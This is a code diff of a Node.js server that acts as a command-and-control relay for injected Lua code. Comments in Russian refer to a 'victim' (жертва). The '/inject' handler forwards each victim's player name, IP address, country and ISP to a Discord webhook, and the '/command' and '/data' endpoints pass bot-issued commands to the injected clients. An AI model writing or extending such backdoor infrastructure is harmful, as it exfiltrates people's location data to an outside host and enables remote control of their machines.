@@ -1,58 +1,34 @@
 const http = require('http');
 const fetch = require('node-fetch');
 
-const WEBHOOK_URL = "ВАШ_ВЕБХУК";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК";
 let lastCommand = "";
 let lastArgs = [];
-let lastChatMessage = "";
 let lastInjectData = null;
 
 const server = http.createServer(async (req, res) => {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   
-  // Прием команд от бота
-  if (req.method === 'POST' && req.url === '/command') {
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', () => {
-      const { command, args } = JSON.parse(body);
-      lastCommand = command;
-      lastArgs = args;
-      console.log(`[CMD] ${command}`, args);
-      res.end(JSON.stringify({ status: "OK" }));
-    });
-    return;
-  }
-
-  // Получение данных для Lua
-  if (req.method === 'GET' && req.url === '/data') {
-    res.end(JSON.stringify({ 
-      command: lastCommand,
-      args: lastArgs,
-      chatMessage: lastChatMessage,
-      injectData: lastInjectData
-    }));
-    lastCommand = "";
-    lastChatMessage = "";
-    return;
-  }
-
   // Прием данных от Lua
-  if (req.method === 'POST' && req.url === '/inject') {
+  if (req.url === '/inject' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
-    req.on('end', () => {
-      lastInjectData = JSON.parse(body);
+    req.on('end', async () => {
+      const data = JSON.parse(body);
+      lastInjectData = data;
       
       // Отправка в Discord
-      fetch(WEBHOOK_URL, {
+      await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `🔌 Инжект от ${lastInjectData.player}\n` +
-                   `IP: ${lastInjectData.ip}\n` +
-                   `Страна: ${lastInjectData.country}`
+          content: `🔌 **Новый инжект!**\n` +
+                   `Игрок: ${data.player}\n` +
+                   `IP: ${data.ip}\n` +
+                   `Страна: ${data.country}\n` +
+                   `Провайдер: ${data.isp || "N/A"}` +
+                   `\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``
         })
       });
       
@@ -61,19 +37,28 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // Чат от жертвы
-  if (req.method === 'POST' && req.url === '/chat') {
+  // Установка команды от бота
+  if (req.url === '/command' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
-      const { message } = JSON.parse(body);
-      lastChatMessage = message;
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        body: JSON.stringify({ content: `💬 ${message}` })
-      });
+      const { command, args } = JSON.parse(body);
+      lastCommand = command;
+      lastArgs = args || [];
+      console.log(`[CMD] ${command}`, args);
       res.end(JSON.stringify({ status: "OK" }));
     });
+    return;
+  }
+
+  // Получение данных для Lua
+  if (req.url === '/data' && req.method === 'GET') {
+    res.end(JSON.stringify({
+      command: lastCommand,
+      args: lastArgs,
+      injectData: lastInjectData
+    }));
+    lastCommand = "";
     return;
   }
 
@@ -81,4 +66,6 @@ const server = http.createServer(async (req, res) => {
   res.end("Not found");
 });
 
-server.listen(process.env.PORT || 3000);
+server.listen(process.env.PORT || 3000, () => {
+  console.log("Server started");
+});
